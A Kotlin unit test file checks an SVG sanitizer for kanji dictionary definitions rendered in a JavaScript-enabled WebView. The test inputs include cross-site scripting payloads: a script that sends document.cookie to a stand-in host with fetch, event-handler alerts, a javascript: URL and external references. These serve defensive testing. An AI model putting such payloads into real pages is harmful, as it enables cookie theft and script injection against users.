// SPDX-License-Identifier: GPL-3.0-or-later
package mihon.core.dictionary.ui

import io.kotest.matchers.shouldBe
import io.kotest.matchers.shouldNotBe
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.string.shouldNotContain
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import mihon.core.dictionary.model.KanjiEntry
import mihon.core.dictionary.model.KanjiResult
import org.junit.jupiter.api.Test

/**
 * Kanji definitions come from third-party dictionaries and are rendered as inline SVG inside a
 * JS-enabled WebView that carries native bridges, so the payload boundary must strip anything that
 * can execute. A normal glyph must survive untouched.
 */
class KanjiSvgSanitizationTest {

    @Test
    fun `kanji payload drops handlers and scripts but keeps the glyph path`() {
        val entry = KanjiEntry(
            dictName = "svg-dict",
            onyomi = "ブ",
            kunyomi = "",
            tags = "",
            definitions = listOf(
                """<svg viewBox="0 0 100 100" onload="alert('x')">""" +
                    """<script>fetch('https://evil.invalid/?d='+document.cookie)</script>""" +
                    """<path d="M0 0" fill="#000"/>""" +
                    """</svg>""",
            ),
            stats = mapOf("stroke count" to "8"),
        )

        val payload = buildKanjiEntryJsonStrings(KanjiResult("武", listOf(entry))).single()
        val definition = Json.parseToJsonElement(payload)
            .jsonObject["kanji"]!!.jsonObject["definitions"]!!.jsonArray[0].jsonPrimitive.content

        definition shouldContain """<path d="M0 0" fill="#000"/>"""
        definition shouldContain """viewBox="0 0 100 100""""
        definition shouldNotContain "onload"
        definition shouldNotContain "script"
        definition shouldNotContain "alert"
        definition shouldNotContain "evil.invalid"
    }

    @Test
    fun `a plain kanji glyph is emitted unchanged`() {
        val glyph = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">""" +
            """<g transform="translate(4 4)"><path d="M0 0 L10 10" fill="none" stroke="#000" """ +
            """stroke-width="4"/></g><text x="2" y="9" font-size="9">一</text></svg>"""

        sanitizeKanjiRichText(glyph) shouldBe glyph
    }

    @Test
    fun `markup that cannot be whitelisted loses the element with its subtree`() {
        val markup = """<svg viewBox="0 0 1 1">""" +
            """<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">""" +
            """<img src="x" onerror="alert(1)"/></div></foreignObject>""" +
            """<style>rect{background:url(https://evil.invalid/a)}</style>""" +
            """<path d="M1 1" style="fill:url(javascript:alert(1))" onclick="alert(2)"/>""" +
            """</svg>"""

        val sanitized = sanitizeKanjiRichText(markup)

        sanitized shouldBe """<svg viewBox="0 0 1 1"><path d="M1 1"/></svg>"""
    }

    @Test
    fun `a definition that is not svg is left alone`() {
        val definition = "a <b>bold</b> meaning with &#x27;quotes&#x27;"

        sanitizeKanjiRichText(definition) shouldBe definition
    }

    @Test
    fun `an external href is reduced to a local reference or dropped`() {
        sanitizeKanjiSvgMarkup("""<svg><use href="https://evil.invalid/a.svg#x"/></svg>""") shouldBe
            "<svg><use/></svg>"
        sanitizeKanjiSvgMarkup("""<svg><use href="#glyph"/></svg>""") shouldBe
            """<svg><use href="#glyph"/></svg>"""
    }

    @Test
    fun `markup without an svg root is returned as inert text`() {
        val sanitized = sanitizeKanjiSvgMarkup("""<g onload="alert(1)"><path d="M0 0"/></g>""")

        sanitized shouldContain "&lt;g"
        sanitized shouldNotContain "<g "
        sanitized shouldNotBe """<g onload="alert(1)"><path d="M0 0"/></g>"""
    }
}
